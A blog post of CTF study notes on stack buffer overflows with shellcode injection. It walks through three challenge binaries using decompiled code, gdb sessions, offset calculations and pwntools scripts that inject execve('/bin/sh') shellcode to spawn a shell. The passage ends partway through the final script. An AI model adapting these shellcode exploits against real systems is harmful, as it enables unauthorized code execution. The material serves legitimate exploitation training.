---
title: "Learning Bin Exp from Scratch 04"
date: "2024-05-31T11:59:59.999Z"
description: "Shellcode Overflows"
author: "ZyphenSVC"
slug: "posts/binexp/2024-05-31-binexp"
---

> Forenote

I'm bored... Might as well become a god of binary exploitation.

This would not be possible if it wasnt for [Nightmare by guyinatuxedo](https://guyinatuxedo.github.io/index.html). This series is a compilation of my summarized notes and remarks done by me and me alone.


# Shellcode Overflows

## CSAW 2017 Pilot

```bash
$ ./pilot
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffeec031d30
[*]Command:d
[*]There are no commands....
[*]Mission Failed....
sriadityavedantam@ZYPHENPC:/mnt/c/Users/sriad/Downloads$ ./pilot
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffe8fd8f820
[*]Command:d
[*]There are no commands....
[*]Mission Failed....
sriadityavedantam@ZYPHENPC:/mnt/c/Users/sriad/Downloads$
```

So we are dealing with an ASLR, but let's confirm:

```python
$ checksec pilot
[*] '/mnt/c/Users/sriad/Downloads/pilot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

```cpp
undefined8 FUN_004009a6(void)

{
  basic_ostream *output;
  basic_ostream<> *this;
  ssize_t sVar1;
  undefined8 uVar2;
  undefined input [32];
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  output = std::operator<<((basic_ostream *)std::cout,"[*]Welcome DropShip Pilot...");
  std::basic_ostream<>::operator<<((basic_ostream<> *)output,std::endl<>);
  output = std::operator<<((basic_ostream *)std::cout,"[*]I am your assitant A.I....");
  std::basic_ostream<>::operator<<((basic_ostream<> *)output,std::endl<>);
  output = std::operator<<((basic_ostream *)std::cout,
                           "[*]I will be guiding you through the tutorial....");
  std::basic_ostream<>::operator<<((basic_ostream<> *)output,std::endl<>);
  output = std::operator<<((basic_ostream *)std::cout,
                           "[*]As a first step, lets learn how to land at the designated location... ."
                          );
  std::basic_ostream<>::operator<<((basic_ostream<> *)output,std::endl<>);
  output = std::operator<<((basic_ostream *)std::cout,
                           "[*]Your mission is to lead the dropship to the right location and execut e sequence of instructions to save Marines & Medics..."
                          );
  std::basic_ostream<>::operator<<((basic_ostream<> *)output,std::endl<>);
  output = std::operator<<((basic_ostream *)std::cout,"[*]Good Luck Pilot!....");
  std::basic_ostream<>::operator<<((basic_ostream<> *)output,std::endl<>);
  output = std::operator<<((basic_ostream *)std::cout,"[*]Location:");
  this = (basic_ostream<> *)std::basic_ostream<>::operator<<((basic_ostream<> *)output,input);
  std::basic_ostream<>::operator<<(this,std::endl<>);
  std::operator<<((basic_ostream *)std::cout,"[*]Command:");
  sVar1 = read(0,input,0x40);
  if (sVar1 < 5) {
    output = std::operator<<((basic_ostream *)std::cout,"[*]There are no commands....");
    std::basic_ostream<>::operator<<((basic_ostream<> *)output,std::endl<>);
    output = std::operator<<((basic_ostream *)std::cout,"[*]Mission Failed....");
    std::basic_ostream<>::operator<<((basic_ostream<> *)output,std::endl<>);
    uVar2 = 0xffffffff;
  }
  else {
    uVar2 = 0;
  }
  return uVar2;
}
```

So this time we are dealing with something new as well, a cpp file! I am not the most well-versed in cpp but let's take a look and see what we can gather.

So something that looks interesting is this line `sVar1 = read(0,input,0x40);` which we are inputting 64 bytes into input, but if we look above, we see that input only has a buffer for 32 bytes. Therefore, we can overflow this.

```cpp
output = std::operator<<((basic_ostream *)std::cout,"[*]Location:");
  this = (basic_ostream<> *)std::basic_ostream<>::operator<<((basic_ostream<> *)output,input);
  std::basic_ostream<>::operator<<(this,std::endl<>);
  ```

Reading the guide, it seems that this prints the start of the stack location which is sensical due to vmmap:

```armasm
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /mnt/c/Users/sriad/Downloads/pilot
0x0000000000601000 0x0000000000602000 0x0000000000001000 r-- /mnt/c/Users/sriad/Downloads/pilot
0x0000000000602000 0x0000000000603000 0x0000000000002000 rw- /mnt/c/Users/sriad/Downloads/pilot
0x0000000000603000 0x0000000000624000 0x0000000000000000 rw- [heap]
0x00007ffff7a55000 0x00007ffff7a59000 0x0000000000000000 rw-
0x00007ffff7a59000 0x00007ffff7a5c000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7a5c000 0x00007ffff7a73000 0x0000000000003000 r-x /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7a73000 0x00007ffff7a77000 0x000000000001a000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7a77000 0x00007ffff7a78000 0x000000000001d000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7a78000 0x00007ffff7a79000 0x000000000001e000 rw- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7a79000 0x00007ffff7a87000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007ffff7a87000 0x00007ffff7b03000 0x000000000000e000 r-x /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007ffff7b03000 0x00007ffff7b5e000 0x000000000008a000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007ffff7b5e000 0x00007ffff7b5f000 0x00000000000e4000 r-- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007ffff7b5f000 0x00007ffff7b60000 0x00000000000e5000 rw- /usr/lib/x86_64-linux-gnu/libm.so.6
0x00007ffff7b60000 0x00007ffff7b88000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7b88000 0x00007ffff7d1d000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7d1d000 0x00007ffff7d75000 0x00000000001bd000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7d75000 0x00007ffff7d76000 0x0000000000215000 --- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7d76000 0x00007ffff7d7a000 0x0000000000215000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7d7a000 0x00007ffff7d7c000 0x0000000000219000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7d7c000 0x00007ffff7d89000 0x0000000000000000 rw-
0x00007ffff7d89000 0x00007ffff7e23000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
0x00007ffff7e23000 0x00007ffff7f34000 0x000000000009a000 r-x /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
0x00007ffff7f34000 0x00007ffff7fa3000 0x00000000001ab000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
0x00007ffff7fa3000 0x00007ffff7fa4000 0x000000000021a000 --- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
0x00007ffff7fa4000 0x00007ffff7faf000 0x000000000021a000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
0x00007ffff7faf000 0x00007ffff7fb2000 0x0000000000225000 rw- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.30
0x00007ffff7fb2000 0x00007ffff7fb5000 0x0000000000000000 rw-
0x00007ffff7fbb000 0x00007ffff7fbd000 0x0000000000000000 rw-
0x00007ffff7fbd000 0x00007ffff7fc1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc1000 0x00007ffff7fc3000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fc5000 0x00007ffff7fef000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fef000 0x00007ffff7ffa000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000037000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
gef➤  b *0x400ae5
Breakpoint 1 at 0x400ae5
gef➤  r
Starting program: /mnt/c/Users/sriad/Downloads/pilot
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fffffffdf20
[*]Command:hey hey hey hey hey

Breakpoint 1, 0x0000000000400ae5 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x14
$rbx   : 0x0
$rcx   : 0x00007ffff7c747e2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x40
$rsp   : 0x00007fffffffdf20  →  "hey hey hey hey hey\n"
$rbp   : 0x00007fffffffdf40  →  0x0000000000000001
$rsi   : 0x00007fffffffdf20  →  "hey hey hey hey hey\n"
$rdi   : 0x0
$rip   : 0x0000000000400ae5  →   cmp rax, 0x4
$r8    : 0xb
$r9    : 0x00007fffffffdde0  →  0x0000000000000000
$r10   : 0x00007ffff7b665e8  →  0x000f001200001a64
$r11   : 0x246
$r12   : 0x00007fffffffe058  →  0x00007fffffffe2d4  →  "/mnt/c/Users/sriad/Downloads/pilot"
$r13   : 0x00000000004009a6  →   push rbp
$r14   : 0x0
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf20│+0x0000: "hey hey hey hey hey\n"      ← $rsp, $rsi
0x00007fffffffdf28│+0x0008: "hey hey hey\n"
0x00007fffffffdf30│+0x0010: 0x000000000a796568 ("hey\n"?)
0x00007fffffffdf38│+0x0018: 0x0000000000400850  →  <std::ios_base::Init::~Init()@plt+0> jmp QWORD PTR [rip+0x2017ea]        # 0x602040 <_ZNSt8ios_base4InitD1Ev@got.plt>
0x00007fffffffdf40│+0x0020: 0x0000000000000001   ← $rbp
0x00007fffffffdf48│+0x0028: 0x00007ffff7b89d90  →  <__libc_start_call_main+128> mov edi, eax
0x00007fffffffdf50│+0x0030: 0x00000000006021b9  →   add BYTE PTR [rax], al
0x00007fffffffdf58│+0x0038: 0x00000000004009a6  →   push rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400ad8                  mov    rsi, rax
     0x400adb                  mov    edi, 0x0
     0x400ae0                  call   0x400820 <read@plt>
●→   0x400ae5                  cmp    rax, 0x4
     0x400ae9                  setle  al
     0x400aec                  test   al, al
     0x400aee                  je     0x400b2f
     0x400af0                  mov    esi, 0x400d90
     0x400af5                  mov    edi, 0x6020a0
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pilot", stopped 0x400ae5 in ?? (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400ae5 → cmp rax, 0x4
[#1] 0x7ffff7b89d90 → __libc_start_call_main(main=0x4009a6, argc=0x1, argv=0x7fffffffe058)
[#2] 0x7ffff7b89e40 → __libc_start_main_impl(main=0x4009a6, argc=0x1, argv=0x7fffffffe058, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe048)
[#3] 0x4008d9 → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern hey hey hey hey hey
[+] Searching 'hey' in memory
[+] In '/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'(0x7ffff7fef000-0x7ffff7ffa000), permission=r--
  0x7ffff7ff4cba - 0x7ffff7ff4cf1  →   "hey are resolved\n  --verify              verify t[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffdf20 - 0x7fffffffdf35  →   "hey hey hey hey hey\n"
  0x7fffffffdf24 - 0x7fffffffdf35  →   "hey hey hey hey\n"
  0x7fffffffdf28 - 0x7fffffffdf35  →   "hey hey hey\n"
  0x7fffffffdf2c - 0x7fffffffdf35  →   "hey hey\n"
  0x7fffffffdf30 - 0x7fffffffdf35  →   "hey\n"
gef➤  i f
Stack level 0, frame at 0x7fffffffdf50:
 rip = 0x400ae5; saved rip = 0x7ffff7b89d90
 called by frame at 0x7fffffffdff0
 Arglist at 0x7fffffffdf18, args:
 Locals at 0x7fffffffdf18, Previous frame's sp is 0x7fffffffdf50
 Saved registers:
  rbp at 0x7fffffffdf40, rip at 0x7fffffffdf48
gef➤
```

This looks really promising, we have our stack location right there! `0x7fffffffdf20`. 

```python
>>> 0x7fffffffdf48 - 0x7fffffffdf20 = 40
```

Hence we found our offset. Now to write the program with the shellcode. After going down the google shellcode lists, I found this shellcode from [zerosum](https://zerosum0x0.blogspot.com/2014/12/there-are-many-versions-of-execve.html).

```python
from pwn import *

target = process("./pilot")


target.recvuntil("Location:")
addr = int(target.recvline()[:-1], 16)

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

p = shellcode + b"a"*(40 - len(shellcode)) + p64(addr)

target.send(p)
target.interactive()
```

```python
$ python ape.py
[+] Starting local process './pilot': pid 31403
/mnt/c/Users/sriad/Downloads/ape.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.recvuntil("Location:")
[*] Switching to interactive mode
[*]Command:$ echo helloworld
helloworld
$
```

## TamuCTF 2019 Pwn3

```python
$ ./pwn3
Take this, you might need it on your journey 0xffd0bf8e!
d
$ file pwn3
pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
$ checksec pwn3
[*] '/mnt/c/Users/sriad/Downloads/nightmare/modules/06-bof_shellcode/tamu19_pwn3/pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

```c
int main(undefined1 param_1)

{
  setvbuf(_stdout,(char *)0x2,0,0);
  echo();
  return 0;
}
```

Let's check out the `echo` function:

```c
void echo(void)

{
  char local_12e [294];
  
  printf("Take this, you might need it on your journey %p!\n",local_12e);
  gets(local_12e);
  return;
}
```

```armasm
gef➤  b *echo+61
.
.
.
gef➤  search-pattern hi
[+] Searching 'hi' in memory
[+] In '/mnt/c/Users/sriad/Downloads/nightmare/modules/06-bof_shellcode/tamu19_pwn3/pwn3'(0x56555000-0x56556000), permission=r-x
  0x565556b6 - 0x565556e2  →   "his, you might need it on your journey %p!\n"
[+] In '/mnt/c/Users/sriad/Downloads/nightmare/modules/06-bof_shellcode/tamu19_pwn3/pwn3'(0x56556000-0x56557000), permission=r--
  0x565566b6 - 0x565566e2  →   "his, you might need it on your journey %p!\n"
[+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
  0x565581a0 - 0x565581a4  →   "hi\n"
[+] In '/usr/lib32/libc.so.6'(0xf7d86000-0xf7da6000), permission=r--
  0xf7d882d2 - 0xf7d882d4  →   "hi[...]"
  0xf7d98ea2 - 0xf7d98eb0  →   "hildren_time64"
  0xf7d98fbb - 0xf7d98fc2  →   "hildren"
  0xf7da0396 - 0xf7da039d  →   "hildren"
[+] In '/usr/lib32/libc.so.6'(0xf7da6000-0xf7f24000), permission=r-x
  0xf7e83ae1 - 0xf7e83ae3  →   "hi[...]"
[+] In '/usr/lib32/libc.so.6'(0xf7f24000-0xf7fa9000), permission=r--
  0xf7f32e88 - 0xf7f32e8a  →   "hi[...]"
  0xf7f36f6e - 0xf7f36f70  →   "hi[...]"
  0xf7f37941 - 0xf7f37950  →   "hild has exited"
  0xf7f37952 - 0xf7f37989  →   "hild has terminated abnormally and did not create [...]"
  0xf7f37991 - 0xf7f379c8  →   "hild has terminated abnormally and created a core [...]"
  0xf7f379d0 - 0xf7f379e0  →   "hild has trapped"
  0xf7f379e2 - 0xf7f379f2  →   "hild has stopped"
  0xf7f379fc - 0xf7f37a0e  →   "hild has continued"
  0xf7f3cb89 - 0xf7f3cb8d  →   "hine"
  0xf7f3ed08 - 0xf7f3ed0e  →   "hive.c"
  0xf7f3f38d - 0xf7f3f39b  →   "hild processes"
  0xf7f3f73f - 0xf7f3f759  →   "hine is not on the network"
  0xf7f3fc44 - 0xf7f3fc4f  →   "hild exited"
  0xf7f41818 - 0xf7f41825  →   "his help list"
  0xf7f41901 - 0xf7f4190e  →   "hing detected"
  0xf7f4271d - 0xf7f42754  →   "his is free software; see the source for copying c[...]"
  0xf7f42b4d - 0xf7f42b60  →   "hijklmnopqrstuvwxyz"
  0xf7f42b91 - 0xf7f42ba4  →   "hijklmnopqrstuvwxyz"
  0xf7f42c07 - 0xf7f42c3e  →   "hijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234[...]"
  0xf7f42e31 - 0xf7f42e4e  →   "hing like this should happen""
  0xf7f42e3c - 0xf7f42e4e  →   "his should happen""
  0xf7f431cb - 0xf7f431da  →   "hive_subfreeres"
  0xf7f431f4 - 0xf7f431f8  →   "hive"
  0xf7f43216 - 0xf7f4321a  →   "hive"
  0xf7f44a8a - 0xf7f44a9c  →   "hile consolidating"
  0xf7f44e29 - 0xf7f44e48  →   "hing next->prev_size (unsorted)"
  0xf7f45ab4 - 0xf7f45ac2  →   "hing operator""
  0xf7f4714f - 0xf7f47161  →   "high version = %lu"
  0xf7f473e3 - 0xf7f47400  →   "hile loading shared libraries"
  0xf7f97e10 - 0xf7f97e12  →   "hi[...]"
[+] In '/usr/lib32/ld-linux.so.2'(0xf7fec000-0xf7ffb000), permission=r--
  0xf7fed630 - 0xf7fed649  →   "his help message and exit"
  0xf7fee4bc - 0xf7fee4c2  →   "hine.h"
  0xf7feeb6d - 0xf7feeb71  →   "hine"
  0xf7fef07a - 0xf7fef085  →   "hibit-cache"
  0xf7fef099 - 0xf7fef0a4  →   "hibit-rpath"
  0xf7fef4d8 - 0xf7fef4e6  →   "hild processes"
  0xf7fef850 - 0xf7fef86a  →   "hine is not on the network"
  0xf7ff0788 - 0xf7ff078e  →   "hing\n"
  0xf7ff0d6c - 0xf7ff0d70  →   "his."
  0xf7ff0e9b - 0xf7ff0eb7  →   "hile initializing profiler\n"
  0xf7ff10a3 - 0xf7ff10b4  →   "hine_rel_relative"
  0xf7ff1783 - 0xf7ff17a0  →   "hile loading shared libraries"
  0xf7ff19b1 - 0xf7ff19e8  →   "his is free software; see the source for copying c[...]"
  0xf7ff1bbf - 0xf7ff1bf6  →   "his is like executing that\nfile itself, but alway[...]"
  0xf7ff1d10 - 0xf7ff1d47  →   "hich would be inherited by subprocesses).\n\n  --l[...]"
  0xf7ff1e06 - 0xf7ff1e3d  →   "hibit-cache       Do not use /etc/ld.so.cache\n  -[...]"
  0xf7ff1f7b - 0xf7ff1fb2  →   "hibit-rpath LIST  ignore RUNPATH and RPATH informa[...]"
  0xf7ff2133 - 0xf7ff216a  →   "his help and exit\n  --version             output [...]"
  0xf7ff2183 - 0xf7ff21ba  →   "his program interpreter self-identifies as: /lib/l[...]"
  0xf7ff295f - 0xf7ff297b  →   "hile loading audit modules\n"
[+] In '/usr/lib32/ld-linux.so.2'(0xf7ffb000-0xf7ffd000), permission=r--
  0xf7ffcd98 - 0xf7ffcd9a  →   "hi"
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
  0xffffae52 - 0xffffae89  →   "his, you might need it on your journey 0xffffceae![...]"
  0xffffceae - 0xffffceb0  →   "hi"
gef➤  i f
Stack level 0, frame at 0xffffcfe0:
 eip = 0x565555da in echo; saved eip = 0x5655561a
 called by frame at 0xffffd000
 Arglist at 0xffffcfd8, args:
 Locals at 0xffffcfd8, Previous frame's sp is 0xffffcfe0
 Saved registers:
  ebx at 0xffffcfd4, ebp at 0xffffcfd8, eip at 0xffffcfdc
gef➤
```

```python
sriadityavedantam@ZYPHENPC:/mnt/c/Users/sriad/Downloads/nightmare/modules/06-bof_shellcode/tamu19_pwn3$ python
Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xffffcfdc - 0xffffceae
302
```

It took a lot of trial and error, but I used this [shellcode for my machine](https://shell-storm.org/shellcode/files/shellcode-811.html).

```python
from pwn import *

target = process("./pwn3")

target.recvuntil(b"Take this, you might need it on your journey ")

addr = int(target.recvline()[:-2],16)

print(addr)

p = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
p += b"a"*(302 - len(p))
p += p32(addr)

target.send(p)
target.interactive()
```

```bash
$ python ape.py
[+] Starting local process './pwn3': pid 10384
4290518750
[*] Switching to interactive mode
$
$
$ w
 14:16:00 up 28 min,  1 user,  load average: 0.00, 0.12, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
sriadity pts/1    -                13:47   28:27   0.01s  0.01s -bash
$
[*] Stopped process './pwn3' (pid 10384)
```

## TUCTF 2018 Shella-easy

```bash
$ ./shella-easy
Yeah I''ll have a 0xffbf5e90 with a side of fries thanks
ddddddddddddddddddddddd
$ file shella-easy l
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
$ checksec shella-easy
[*] '/mnt/c/Users/sriad/Downloads/nightmare/modules/06-bof_shellcode/tu18_shellaeasy/shella-easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

```c
undefined4 main(void)

{
  char input [64];
  int key;
  
  setvbuf(_stdout,(char *)0x0,2,0x14);
  setvbuf(_stdin,(char *)0x0,2,0x14);
  key = -0x35014542;
                    /* Location of input */
  printf("Yeah I\'ll have a %p with a side of fries thanks\n",input);
  gets(input);
  if (key != -0x21524111) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return 0;
}
```

```armasm
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined4  __cdecl  main (void )
             undefined4        EAX:4          <RETURN>
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     08048556 (R)   
             undefined4        Stack[-0xc]:4  key                                     XREF[2]:     0804851b (W) , 
                                                                                                   08048541 (R)   
             undefined1[64]    Stack[-0x4c]   input                                   XREF[2]:     08048522 (*) , 
                                                                                                   08048535 (*)   
                             main                                            XREF[4]:     Entry Point (*) , 
                                                                                          _start:080483f7 (*) , 08048630 , 
                                                                                          080486a0 (*)   
        080484db 55              PUSH       EBP
```

Offset to key is `0x4c - 0xc = 64`.

```armasm
gef➤  x/s $ebp-0x8
0xffffcfc0:     "\276\272\376", <incomplete sequence \312>
```

This is the current value of the key.

```python
from pwn import *

target = process("./shella-easy")

target.recvuntil(b"Yeah I'll have a ")

addr = int(target.recvline()[:-30],16)

print(addr)

p = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
p += b"a"*(64 - len(p)) + p32(0xdeadbeef)
print(p)
```

```bash
$ python ape.p
y
[+] Starting local process './shella-easy': pid 20871
268336992
b'1\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde'
[*] Switching to interactive mode
$
[*] Got EOF while reading in interactive
$
```

So we now have some shellcode, but it wasn't working when I was inputting into the program. Thus let's input into gdb and see whats happening in memory.

```armasm
gef➤  x/s $ebp-0x8
0xffffcfc0:     "cd\\x80", 'a' <repeats 36 times>, "\\xef\\xbe\\xad\\xde"
```

Oh boy. We have the last 2 bytes of the shellcode invading as well as our offset of 'a'. This is not good. 

```armasm
gef➤  ni
0x08048548 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcf80  →  "1\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\x[...]"
$ebx   : 0x0804a000  →  0x08049f0c  →  <_DYNAMIC+0> add DWORD PTR [eax], eax
$ecx   : 0xf7fad9c0  →  0x00000000
$edx   : 0x1
$esp   : 0xffffcf80  →  "1\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\x[...]"
$ebp   : 0xffffcfc8  →  0x61616161 ("aaaa"?)
$esi   : 0xffffd084  →  0xffffd1e6  →  "/mnt/c/Users/sriad/Downloads/nightmare/modules/06-[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x08048548  →  <main+109> je 0x8048551 <main+118>
$eflags: [zero CARRY PARITY ADJUST SIGN trap INTERRUPT direction OVERFLOW resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf80│+0x0000: "1\xc0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\x[...]"    ← $esp
0xffffcf84│+0x0004: "0Ph//shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x[...]"
0xffffcf88│+0x0008: "/shh/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\[...]"
0xffffcf8c│+0x000c: "/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@[...]"
0xffffcf90│+0x0010: "\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd[...]"
0xffffcf94│+0x0014: 0x3365785c
0xffffcf98│+0x0018: 0x3938785c
0xffffcf9c│+0x001c: 0x3163785c
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048539 <main+94>        call   0x8048390 <gets@plt>
    0x804853e <main+99>        add    esp, 0x4
    0x8048541 <main+102>       cmp    DWORD PTR [ebp-0x8], 0xdeadbeef
 →  0x8048548 <main+109>       je     0x8048551 <main+118>      NOT taken [Reason: !(Z)]
    0x804854a <main+111>       push   0x0
    0x804854c <main+113>       call   0x80483a0 <exit@plt>
    0x8048551 <main+118>       mov    eax, 0x0
    0x8048556 <main+123>       mov    ebx, DWORD PTR [ebp-0x4]
    0x8048559 <main+126>       leave
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "shella-easy", stopped 0x8048548 in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048548 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

This confirms it. So something is wrong with our offset.

I switched to shellstorm-827 as stated in the guide which is less bytes, `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`, and when we check the key comparison, we find

```armasm
gef➤  x/10s $ebp-0x8
0xffffcfc0:     'a' <repeats 27 times>, "\\xef\\xbe\\xad\\xde"
0xffffcfec:     "\204\320\377\377"
0xffffcff1:     "\300\372\367\204\320\377\377\200\313\377\367 \320\377\367H{2\307XqD\214"
0xffffd009:     ""
0xffffd00a:     ""
0xffffd00b:     ""
0xffffd00c:     ""
0xffffd00d:     ""
0xffffd00e:     ""
0xffffd00f:     ""
```

Which is closer.

```bash
$ wc
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
      1       1      42
```

So we have 42 characters. Let's hard code this offset to be perfect. I reduced the buffer down to 14 a's.

```python
from pwn import *

target = process("./shella-easy")
#gdb.attach(target, gdbscript = 'b *0x804853e')

target.recvuntil(b"Yeah I'll have a ")

addr = int(target.recvline()[:-30],16)

print(addr)

p = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
p += b"a"*14 + p32(0xdeadbeef)
#print(p)
